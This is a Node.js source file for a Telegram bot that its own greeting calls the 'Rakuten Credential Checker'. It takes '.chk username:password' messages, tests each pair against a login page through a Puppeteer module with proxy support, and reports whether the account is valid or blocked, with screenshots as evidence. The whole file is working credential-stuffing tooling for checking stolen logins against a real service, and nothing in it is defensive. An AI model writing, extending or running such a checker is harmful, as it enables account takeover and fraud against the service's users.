const TelegramBot = require('node-telegram-bot-api');
const { checkCredentials } = require('./puppeteerChecker');

/**
 * Validates and parses the credential string format "user:pass".
 * @param {string} credentialString - Raw credential string
 * @returns {Object|null} { username, password } or null if invalid
 */
function parseCredentials(credentialString) {
  if (!credentialString || typeof credentialString !== 'string') {
    return null;
  }

  const parts = credentialString.split(':');
  if (parts.length !== 2 || !parts[0].trim() || !parts[1].trim()) {
    return null;
  }

  return {
    username: parts[0].trim(),
    password: parts[1].trim(),
  };
}

/**
 * Guards input for safety and valid format.
 * @param {string} credentialString - Raw credential string
 * @returns {Object} { valid: boolean, error?: string }
 */
function guardInput(credentialString) {
  if (!credentialString) {
    return { valid: false, error: 'Credential string is required.' };
  }

  if (credentialString.length > 200) {
    return { valid: false, error: 'Credential string too long.' };
  }

  if (!credentialString.includes(':')) {
    return { valid: false, error: 'Format must be: `.chk username:password`' };
  }

  const creds = parseCredentials(credentialString);
  if (!creds) {
    return { valid: false, error: 'Invalid format. Please use: `.chk username:password`' };
  }

  return { valid: true };
}

/**
 * Formats a result object into a user-friendly Telegram message.
 * @param {Object} result - Result from checkCredentials
 * @param {string} result.status - Status code
 * @param {string} result.message - Status message
 * @param {string} [result.evidence] - Optional screenshot path
 * @returns {string} Formatted message for Telegram
 */
function formatResultMessage(result) {
  const statusEmoji = {
    VALID: '✅',
    INVALID: '❌',
    BLOCKED: '🔒',
    ERROR: '⚠️',
  };

  const emoji = statusEmoji[result.status] || '❓';
  return `${emoji} **${result.status}**\n\n${result.message}`;
}

/**
 * Initializes and sets up the Telegram handler.
 * @param {string} botToken - Telegram bot token
 * @param {Object} [options] - Optional configuration
 * @returns {TelegramBot} Configured bot instance
 */
function initializeTelegramHandler(botToken, options = {}) {
  const bot = new TelegramBot(botToken, { polling: true });

  // Listen for any message
  bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text || '';

    // Check if message starts with .chk command
    if (!text.startsWith('.chk ')) {
      return; // Silently ignore non-command messages
    }

    // Extract credential string after ".chk "
    const credentialString = text.substring(5).trim();

    // Guard input
    const guard = guardInput(credentialString);
    if (!guard.valid) {
      bot.sendMessage(chatId, guard.error);
      return;
    }

    // Parse credentials
    const creds = parseCredentials(credentialString);
    if (!creds) {
      bot.sendMessage(chatId, 'Failed to parse credentials. Please use: `.chk username:password`');
      return;
    }

    // Send processing message
    bot.sendMessage(chatId, '⏳ Checking credentials...');

    try {
      // Check credentials
      const result = await checkCredentials({
        username: creds.username,
        password: creds.password,
        options: {
          timeoutMs: options.timeoutMs || 60000,
          proxy: options.proxy,
          screenshotOn: options.screenshotOn || false,
          targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
        },
      });

      // Format and send result
      const message = formatResultMessage(result);
      await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });

      // Send screenshot if available
      if (result.evidence) {
        try {
          await bot.sendPhoto(chatId, result.evidence, {
            caption: `Evidence: ${result.status}`,
          });
        } catch (err) {
          console.error('Failed to send screenshot:', err.message);
          // Don't fail the entire operation if screenshot fails
        }
      }
    } catch (err) {
      console.error('Credential check error:', err.message);
      bot.sendMessage(
        chatId,
        `⚠️ **ERROR**\n\nAn unexpected error occurred: ${err.message}`
      );
    }
  });

  // Log when bot starts
  bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(
      chatId,
      'Welcome to Rakuten Credential Checker!\n\n' +
        'Usage: `.chk username:password`\n\n' +
        'Example: `.chk john@example.com:mypassword123`'
    );
  });

  return bot;
}

module.exports = {
  initializeTelegramHandler,
  parseCredentials,
  guardInput,
  formatResultMessage,
};
